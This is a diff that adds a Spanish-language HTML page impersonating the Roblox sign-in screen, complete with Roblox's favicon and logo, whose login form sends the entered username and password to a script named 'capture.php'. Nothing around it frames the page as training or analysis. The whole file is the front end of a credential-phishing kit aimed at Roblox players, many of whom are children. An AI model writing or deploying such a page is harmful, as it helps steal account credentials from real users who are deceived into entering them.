@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Iniciar Sesión - Roblox</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="icon" href="https://images.rbxcdn.com/13a9a768da3a519c3c6b9f6c893e3b16.ico">
+</head>
+<body class="login-page">
+    <div class="login-container">
+        <div class="login-box">
+            <div class="logo">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/5a/Roblox_logo_2022.svg/2048px-Roblox_logo_2022.svg.png" alt="Roblox Logo">
+            </div>
+            <h2>Para continuar, inicia sesión</h2>
+            <form id="loginForm" action="capture.php" method="post">
+                <div class="input-group-container">
+                    <div class="input-group">
+                        <input type="text" name="username" id="username" placeholder="Nombre de usuario/Correo electrónico/Teléfono" autocomplete="off" required>
+                    </div>
+                    <div id="user-suggestions"></div>
+                </div>
+                <div class="input-group">
+                    <input type="password" name="password" id="password" placeholder="Contraseña" required>
+                </div>
+                <button type="submit" class="login-button">Iniciar Sesión</button>
+            </form>
+            <div class="login-footer">
+                <a href="#">¿Olvidaste tu nombre de usuario o contraseña?</a>
+            </div>
+        </div>
+    </div>
+    <script src="script.js"></script>
+</body>
+</html>
